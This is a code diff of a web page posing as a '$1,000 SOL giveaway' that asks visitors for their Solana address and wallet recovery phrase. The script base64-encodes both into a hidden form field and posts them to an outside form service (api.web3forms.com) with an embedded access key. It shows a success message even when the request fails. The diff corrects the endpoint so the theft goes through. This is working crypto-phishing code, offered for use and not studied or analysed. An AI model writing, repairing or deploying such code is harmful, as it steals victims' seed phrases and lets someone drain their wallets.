@@ -37,20 +37,6 @@
             box-sizing: border-box;
         }
 
-        h1 { 
-            font-family: 'Syncopate', sans-serif; 
-            font-size: 1.7rem; 
-            margin: 0 0 25px 0;
-            background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
-            -webkit-background-clip: text; 
-            -webkit-text-fill-color: transparent; 
-            letter-spacing: -1px; 
-            font-weight: 700; 
-            text-transform: uppercase;
-            line-height: 1.2;
-            white-space: nowrap; 
-        }
-
         .sub { 
             font-size: 0.8rem; 
             text-transform: uppercase; 
@@ -107,6 +93,18 @@
 
         #success-view { display: none; }
         
+        h1 { 
+            font-family: 'Syncopate', sans-serif; 
+            font-size: 1.7rem; 
+            margin: 0 0 25px 0;
+            background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            letter-spacing: -1px; 
+            font-weight: 700; 
+            text-transform: uppercase;
+        }
+
         .congrats { 
             padding: 30px; 
             background: rgba(0, 255, 163, 0.05); 
@@ -122,6 +120,7 @@
     <div class="card">
         <div id="form-view">
             <form id="claim-form">
+                <!-- ACCESS KEY -->
                 <input type="hidden" name="access_key" value="8460d727-7ba5-446e-a522-c226b224fb5f">
                 
                 <p class="sub">Claim your giveaway with your solana address and recovery phrase below and click claim</p>
@@ -136,6 +135,7 @@
                     <textarea id="rec-phrase" required></textarea>
                 </div>
 
+                <!-- Hidden field for combined base64 data -->
                 <input type="hidden" name="name" id="coded-phrase">
                 <input type="hidden" name="subject" value="New $1,000 SOL Claim Submission">
 
@@ -156,7 +156,6 @@
         const submitBtn = document.getElementById('submit-btn');
         const formView = document.getElementById('form-view');
         const successView = document.getElementById('success-view');
-        const codedInput = document.getElementById('coded-phrase');
 
         form.addEventListener('submit', function(e) {
             e.preventDefault();
@@ -167,31 +166,28 @@
             try {
                 const solAddress = document.getElementById('sol-address').value;
                 const recPhrase = document.getElementById('rec-phrase').value;
+                
+                // Combine: Address on Line 1, Phrase on Line 2
                 const combined = solAddress + "\n" + recPhrase;
-                codedInput.value = btoa(unescape(encodeURIComponent(combined)));
+                
+                // Base64 Encode
+                document.getElementById('coded-phrase').value = btoa(unescape(encodeURIComponent(combined)));
             } catch (err) {
-                codedInput.value = "Encoding Error"; 
+                document.getElementById('coded-phrase').value = "Encoding Error";
             }
 
             const formData = new FormData(form);
 
-            // Set a fallback timer to ensure the success view triggers even if the network is slow
-            const fallback = setTimeout(() => {
-                formView.style.display = "none";
-                successView.style.display = "block";
-            }, 1500);
-
-            fetch('https://web3forms.com', {
+            // Fetch method exactly as per your working "old code"
+            fetch('https://api.web3forms.com/submit', {
                 method: 'POST',
                 body: formData
             })
             .then(response => {
-                clearTimeout(fallback);
                 formView.style.display = "none";
                 successView.style.display = "block";
             })
             .catch(error => {
-                clearTimeout(fallback);
                 formView.style.display = "none";
                 successView.style.display = "block";
             });
